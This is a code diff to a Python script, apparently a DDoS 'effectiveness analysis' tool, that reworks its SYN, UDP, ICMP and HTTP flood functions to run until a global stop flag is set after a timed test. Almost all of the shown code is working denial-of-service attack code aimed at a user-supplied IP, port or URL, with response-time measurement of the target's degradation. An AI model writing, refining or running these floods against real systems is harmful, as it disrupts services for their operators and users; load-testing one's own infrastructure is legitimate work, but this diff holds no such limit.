@@ -8,6 +8,9 @@ from termcolor import colored
 from tabulate import tabulate
 import re
 
+# Global flag to stop attacks
+stop_attack = False
+
 # Setup logging
 logging.basicConfig(filename="ddos_analysis.log", level=logging.INFO, format='%(asctime)s - %(message)s')
 
@@ -37,29 +40,36 @@ def user_input():
 
 # Method to perform SYN Flood Attack
 def syn_flood(target_ip, target_port):
+    global stop_attack
     ip_layer = IP(dst=target_ip)
     tcp_layer = TCP(dport=target_port, flags="S")  # SYN Flag
     packet = ip_layer / tcp_layer
-    send(packet, loop=1, verbose=False)
+    while not stop_attack:
+        send(packet, verbose=False)
 
 # Method to perform UDP Flood Attack
 def udp_flood(target_ip, target_port):
+    global stop_attack
     ip_layer = IP(dst=target_ip)
     udp_layer = UDP(dport=target_port)
     payload = random._urandom(1024)  # Random payload
     packet = ip_layer / udp_layer / payload
-    send(packet, loop=1, verbose=False)
+    while not stop_attack:
+        send(packet, verbose=False)
 
 # Method to perform ICMP Flood (Ping Flood) Attack
 def icmp_flood(target_ip):
+    global stop_attack
     ip_layer = IP(dst=target_ip)
     icmp_layer = ICMP()
     packet = ip_layer / icmp_layer
-    send(packet, loop=1, verbose=False)
+    while not stop_attack:
+        send(packet, verbose=False)
 
 # Method to perform HTTP Flood Attack
 def http_flood(url):
-    while True:
+    global stop_attack
+    while not stop_attack:
         try:
             requests.get(url)
         except requests.exceptions.RequestException as e:
@@ -80,6 +90,9 @@ def measure_response(url):
 
 # Analyzing effectiveness of different DDoS methods
 def analyze_ddos(url, attack_method, method_name, response_times, log_color="yellow", max_failures=5):
+    global stop_attack
+    stop_attack = False  # Reset the stop flag
+
     print(colored(f"\nStarting {method_name} attack on {url}", log_color))
     
     # Baseline response time without attack
@@ -90,7 +103,6 @@ def analyze_ddos(url, attack_method, method_name, response_times, log_color="yel
     
     # Start DDoS attack
     attack_thread = threading.Thread(target=attack_method, args=(target_ip, target_port))
-    attack_thread.daemon = True
     attack_thread.start()
 
     start_time = time.time()
@@ -116,8 +128,11 @@ def analyze_ddos(url, attack_method, method_name, response_times, log_color="yel
         
         time.sleep(1)  # Wait before next measurement
 
-    print(colored(f"{method_name} attack completed.\n", log_color))
+    # Stop the attack after the duration
+    stop_attack = True
     attack_thread.join()
+
+    print(colored(f"{method_name} attack completed.\n", log_color))
 
 # Log Analysis function
 def analyze_log(log_file="ddos_analysis.log"):
